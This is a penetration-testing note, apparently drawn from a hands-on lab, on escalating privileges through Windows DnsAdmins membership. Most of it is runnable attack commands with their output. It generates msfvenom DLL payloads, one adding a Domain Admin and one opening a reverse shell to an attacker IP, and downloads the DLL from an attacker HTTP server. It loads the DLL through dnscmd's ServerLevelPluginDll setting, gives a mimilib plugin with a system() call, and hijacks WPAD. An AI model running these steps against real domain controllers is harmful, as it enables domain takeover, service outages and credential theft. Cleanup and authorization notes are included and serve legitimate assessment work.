---
title: Windows Privilege Escalation – DnsAdmins
aliases:
  - DnsAdmins
  - DNS Admins
  - DNS ServerLevelPluginDll Abuse
  - DNS Plugin DLL Privilege Escalation
  - WPAD Abuse via DnsAdmins
tags:
  - windows
  - privilege-escalation
  - active-directory
  - dnsadmins
  - dns
  - domain-controller
  - dnscmd
  - dll-hijacking
  - serverlevelplugindll
  - wpad
  - responder
  - inveigh
  - pentesting
---

# Windows Privilege Escalation – DnsAdmins

## Overview

Members of the `DnsAdmins` group have access to DNS management functionality in an Active Directory environment.

This group can become highly privileged because the Windows DNS service supports custom plugins. These plugins are DLLs that the DNS service can load to resolve name queries that are not in the scope of locally hosted DNS zones.

The DNS service runs as:

```text
NT AUTHORITY\SYSTEM
```

If DNS is running on a Domain Controller, abusing `DnsAdmins` group membership may allow privilege escalation to SYSTEM on the Domain Controller.

> [!warning]
> This attack can be destructive. Restarting DNS on a Domain Controller can disrupt name resolution for the entire Active Directory environment.

---

# Why DnsAdmins Matters

The Windows DNS service allows a server-level plugin DLL to be configured.

The key issue:

```text
ServerLevelPluginDll allows a custom DLL path to be configured with little path verification.
```

A member of `DnsAdmins` can use `dnscmd.exe` to configure this DLL path.

When the DNS service restarts, it loads the configured DLL.

If the DLL is malicious and the DNS service runs as SYSTEM, the payload runs as SYSTEM.

---

# Attack Requirements

This attack generally requires:

- membership in `DnsAdmins`
- access to `dnscmd.exe`
- ability to place a DLL where the DNS server can access it
- DNS service restart or waiting for a restart
- DNS running on a Domain Controller or other high-value DNS server

> [!important]
> `DnsAdmins` membership alone does not automatically grant the ability to restart the DNS service. Service restart permissions must be checked separately.

---

# High-Level Attack Flow

1. Confirm `DnsAdmins` membership.
2. Generate a malicious DLL.
3. Transfer the DLL to the target or accessible share.
4. Configure DNS `ServerLevelPluginDll` with `dnscmd.exe`.
5. Restart the DNS service, if permitted.
6. Confirm payload execution.
7. Clean up the registry configuration.
8. Restart DNS cleanly and verify service health.

---

# Method 1 – Abuse ServerLevelPluginDll

## How the Abuse Works

The attack works because:

1. DNS management is performed over RPC.
2. `ServerLevelPluginDll` allows a custom DLL path to be configured.
3. `dnscmd.exe` can configure the DLL from the command line.
4. The registry key is populated at:

```text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll
```

5. When the DNS service restarts, the DLL path is loaded.
6. The custom DLL executes in the context of the DNS service.

Since DNS commonly runs as SYSTEM on a Domain Controller, this may lead to Domain Controller compromise.

---

# Step 1 – Generate a Malicious DLL

The notes use `msfvenom` to generate a DLL that adds a user to the `Domain Admins` group.

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

Alternatively (Proven works), for a reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.123 LPORT=4444 -f dll -o reverse.dll
```

Example output:

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

> [!note]
> The source example adds the `netadm` user to `Domain Admins`. In a real assessment, this action should only be performed with explicit authorization.

---

# Step 2 – Start a Local HTTP Server

Host the DLL from the attack machine.

```bash
python3 -m http.server 7777
```

Example output:

```text
Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -
```

---

# Step 3 – Download the DLL to the Target

From the target system, download the DLL.

```powershell
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

> [!important]
> The DLL must be stored at a path the DNS service can access when it restarts.

---

# Step 4 – Test DLL Loading as a Non-Privileged User

Attempting to configure the plugin DLL as a normal user should fail.

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

Example output:

```cmd
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

This confirms the action requires appropriate DNS administrative privileges.

---

# Step 5 – Confirm DnsAdmins Membership

Check group membership.

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

Example output:

```powershell
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109
```

In this example, `netadm` is a member of `DnsAdmins`.

---

# Step 6 – Configure the Custom DLL

Run `dnscmd.exe` again as a member of `DnsAdmins`.

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

Example output:

```cmd
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

> [!important]
> The full path to the custom DLL must be specified or the attack may not work properly.

> [!note]
> Members of `DnsAdmins` can use `dnscmd.exe` for this configuration, but they do not directly have permission on the underlying registry key.

---

# Step 7 – Understand Service Restart Requirement

After the registry setting is configured, the DLL loads the next time the DNS service starts.

This means one of the following must happen:

- the attacker has permission to restart DNS
- an administrator restarts DNS
- the server restarts
- the DNS service restarts naturally for another reason

> [!warning]
> Restarting DNS on a Domain Controller can impact the entire domain. Coordinate and obtain explicit permission before doing this in an assessment.

---

# Step 8 – Check DNS Service Permissions

Membership in `DnsAdmins` does not guarantee the ability to restart the DNS service.

Check whether the current user has service start and stop permissions.

---

## Find the User SID

```cmd
wmic useraccount where name="netadm" get sid
```

Example output:

```cmd
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

---

## Check DNS Service Security Descriptor

```cmd
sc.exe sdshow DNS
```

Example output:

```cmd
C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

In this example, the user SID has:

```text
RPWP
```

These map to:

| Permission | Meaning |
|---|---|
| `RP` | `SERVICE_START` |
| `WP` | `SERVICE_STOP` |

---

# Step 9 – Stop the DNS Service

If authorized and permitted, stop the DNS service.

```cmd
sc stop dns
```

Example output:

```cmd
C:\htb> sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
```

---

# Step 10 – Start the DNS Service

Start the DNS service.

```cmd
sc start dns
```

Example output:

```cmd
C:\htb> sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6960
        FLAGS              :
```

> [!note]
> The DNS service may attempt to start and execute the DLL but fail to start correctly afterward. Cleanup is required.

---

# Step 11 – Confirm Payload Execution

If the payload added a user to `Domain Admins`, confirm group membership.

```cmd
net group "Domain Admins" /dom
```

Example output:

```cmd
C:\htb> net group "Domain Admins" /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

---

# Cleanup

## Why Cleanup Matters

Configuring a malicious DNS plugin and restarting DNS is a destructive action.

Potential impact:

- DNS service fails to start
- Domain Controller name resolution breaks
- authentication issues across the domain
- business service disruption
- client outage

> [!warning]
> Cleanup steps require an elevated console with a local or domain admin account.

---

# Step 1 – Confirm Registry Key Was Added

Query the DNS service parameters registry key.

```cmd
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

Example output:

```cmd
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```

The important value is:

```text
ServerLevelPluginDll
```

Until the malicious DLL configuration is removed, DNS may not start correctly.

---

# Step 2 – Delete ServerLevelPluginDll Registry Value

Remove the registry value pointing to the custom DLL.

```cmd
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

Example output:

```cmd
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

---

# Step 3 – Start DNS Again

```cmd
sc.exe start dns
```

Example output:

```cmd
C:\htb> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4984
        FLAGS              :
```

---

# Step 4 – Check DNS Service Status

```cmd
sc query dns
```

Example output:

```cmd
C:\htb> sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Also validate DNS resolution with `nslookup`.

```cmd
nslookup localhost
```

or:

```cmd
nslookup <domain_host>
```

---

# Alternative – Using mimilib.dll

The notes mention that `mimilib.dll` from the creator of Mimikatz can be modified for command execution through DNS plugin functionality.

The referenced file is:

```text
kdns.c
```

The command execution location is inside `kdns_DnsPluginQuery`.

Example source structure:

```c
/*  Benjamin DELPY `gentilkiwi`
    https://blog.gentilkiwi.com
    benjamin@gentilkiwi.com
    Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
    FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
    if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
    {
        klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
        fclose(kdns_logfile);
        system("ENTER COMMAND HERE");
    }
    return ERROR_SUCCESS;
}
```

> [!important]
> This approach still depends on DNS loading a custom plugin DLL and should be treated with the same operational risk as the previous method.

---

# Method 2 – Create a WPAD Record

## Overview

Another way to abuse `DnsAdmins` privileges is by creating a `WPAD` DNS record.

`DnsAdmins` members can disable the global query block list, which normally blocks this attack by default.

---

# Why WPAD Matters

WPAD stands for:

```text
Web Proxy Automatic Discovery Protocol
```

If WPAD is used with default settings, machines may attempt to locate proxy configuration through DNS.

If an attacker creates a malicious `wpad` record, client traffic may be proxied through an attacker-controlled machine.

This can enable:

- traffic spoofing
- NTLM hash capture
- offline cracking
- SMB relay attacks

Tools mentioned in the notes:

```text
Responder
Inveigh
```

---

# Global Query Block List

Windows Server 2008 introduced the global query block list.

By default, it blocks names such as:

```text
WPAD
ISATAP
```

These are blocked because they are vulnerable to hijacking.

---

# Step 1 – Disable the Global Query Block List

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

> [!warning]
> Disabling the global query block list can expose the environment to WPAD and ISATAP hijacking risks.

---

# Step 2 – Add a WPAD Record

Create a WPAD record pointing to the attack machine.

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

### Command breakdown

| Part | Purpose |
|---|---|
| `Add-DnsServerResourceRecordA` | Add an A record to DNS |
| `-Name wpad` | Create the `wpad` hostname |
| `-ZoneName inlanefreight.local` | Target DNS zone |
| `-ComputerName dc01.inlanefreight.local` | DNS server |
| `-IPv4Address 10.10.14.3` | Attacker-controlled host |

---

# Practical Decision Tree

## Is the user in DnsAdmins?

Check:

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

If the controlled user is a member, continue.

---

## Is DNS running on a Domain Controller?

If yes, abuse may lead to Domain Controller-level impact because DNS commonly runs as SYSTEM.

---

## Can a custom DLL be configured?

Try:

```cmd
dnscmd.exe /config /serverlevelplugindll <full_path_to_dll>
```

If access is denied, the user may not have required DNS admin rights.

---

## Can DNS be restarted?

Find the user's SID:

```cmd
wmic useraccount where name="<username>" get sid
```

Check DNS service permissions:

```cmd
sc.exe sdshow DNS
```

Look for:

```text
RPWP
```

Meaning:

```text
SERVICE_START
SERVICE_STOP
```

---

## Is full exploitation authorized?

If yes:

1. Configure `ServerLevelPluginDll`.
2. Restart DNS.
3. Confirm execution.
4. Remove registry value.
5. Restart DNS cleanly.
6. Confirm DNS is running.
7. Validate name resolution.

If not authorized:

- document group membership
- document ability to configure DNS plugin
- document potential impact
- avoid restarting DNS

---

# Troubleshooting

## `dnscmd.exe` returns access denied

Example:

```text
Command failed: ERROR_ACCESS_DENIED
```

Possible causes:

- user is not in `DnsAdmins`
- command is not running in the expected context
- target DNS server is not reachable
- insufficient privileges for DNS configuration

---

## DLL does not execute

Check:

- full DLL path was specified
- DNS service can access the DLL path
- payload architecture matches target
- DNS service restarted after configuration
- endpoint protection did not block the DLL
- DLL exports / plugin behavior are compatible

---

## DNS service fails to start

Likely cause:

```text
ServerLevelPluginDll still points to the custom DLL.
```

Cleanup:

```cmd
reg delete \\<dns_server>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

Then restart DNS:

```cmd
sc.exe start dns
```

---

## Cannot restart DNS

Possible reasons:

- `DnsAdmins` does not include service control permissions
- user lacks `SERVICE_START`
- user lacks `SERVICE_STOP`
- UAC or elevation issue
- service control is restricted

Check permissions:

```cmd
sc.exe sdshow DNS
```

---

## WPAD attack does not work

Possible causes:

- global query block list still enabled
- `wpad` record was not created in the correct zone
- clients do not use WPAD
- network traffic does not route through attacker host
- Responder/Inveigh not positioned correctly
- SMB signing or relay protections reduce impact

---

# Command Reference

## Generate DLL payload

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

## Start local HTTP server

```bash
python3 -m http.server 7777
```

## Download DLL to target

```powershell
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

## Configure DNS plugin DLL

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

## Check DnsAdmins membership

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

## Find user SID

```cmd
wmic useraccount where name="netadm" get sid
```

## Check DNS service security descriptor

```cmd
sc.exe sdshow DNS
```

## Stop DNS service

```cmd
sc stop dns
```

## Start DNS service

```cmd
sc start dns
```

## Confirm Domain Admins membership

```cmd
net group "Domain Admins" /dom
```

## Query DNS registry parameters

```cmd
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

## Delete ServerLevelPluginDll registry value

```cmd
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

## Check DNS service status

```cmd
sc query dns
```

## Test DNS resolution

```cmd
nslookup localhost
```

## Disable global query block list

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

## Add WPAD DNS record

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

---

# Cleanup Checklist

## ServerLevelPluginDll cleanup

Confirm value exists:

```cmd
reg query \\<dns_server>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

Delete value:

```cmd
reg delete \\<dns_server>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

Restart DNS:

```cmd
sc.exe start dns
```

Confirm DNS is running:

```cmd
sc query dns
```

Validate DNS resolution:

```cmd
nslookup <domain_host>
```

---

## WPAD cleanup

If a WPAD record was created, remove it.

```powershell
Remove-DnsServerResourceRecord -ZoneName <zone_name> -Name wpad -RRType A -ComputerName <dns_server>
```

If the global query block list was disabled, re-enable it.

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $true -ComputerName <dns_server>
```

> [!note]
> The cleanup commands above for WPAD are practical follow-up steps. The source notes include disabling the global query block list and adding the WPAD record but do not provide explicit cleanup commands for WPAD.

---

# Reporting Notes

Document:

- `DnsAdmins` group members
- DNS server where abuse was possible
- whether DNS was running on a Domain Controller
- whether `ServerLevelPluginDll` could be configured
- whether DNS restart permissions existed
- whether proof-of-concept execution was performed
- business risk of DNS service interruption
- cleanup actions completed
- any residual changes or client actions required

> [!important]
> If the client does not approve restarting DNS, document the capability and risk without triggering the DLL.

---

# Key Takeaways

- `DnsAdmins` membership can be dangerous in Active Directory environments.
- Windows DNS supports custom plugin DLLs.
- `dnscmd.exe` can configure `ServerLevelPluginDll`.
- The DNS service runs as `NT AUTHORITY\SYSTEM`.
- If DNS runs on a Domain Controller, DLL plugin abuse can lead to Domain Controller compromise.
- `DnsAdmins` membership does not automatically grant DNS service restart permissions.
- Check service permissions with `sc.exe sdshow DNS`.
- Cleanup is critical because a malicious or broken plugin DLL can prevent DNS from starting.
- `DnsAdmins` can also abuse WPAD by disabling the global query block list and creating a `wpad` record.
- WPAD abuse may support hash capture, offline cracking, or SMB relay attacks.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[Windows Built-In Groups]]
- [[DnsAdmins]]
- [[Active Directory]]
- [[Domain Controller]]
- [[DNS]]
- [[dnscmd]]
- [[ServerLevelPluginDll]]
- [[Windows Services]]
- [[SDDL]]
- [[WPAD]]
- [[Responder]]
- [[Inveigh]]
- [[SMB Relay]]
- [[Mimikatz]]

---

# Tags

#windows
#privilege-escalation
#dnsadmins
#dns
#active-directory
#domain-controller
#dnscmd
#serverlevelplugindll
#dll-abuse
#wpad
#responder
#inveigh
#smb-relay
#pentesting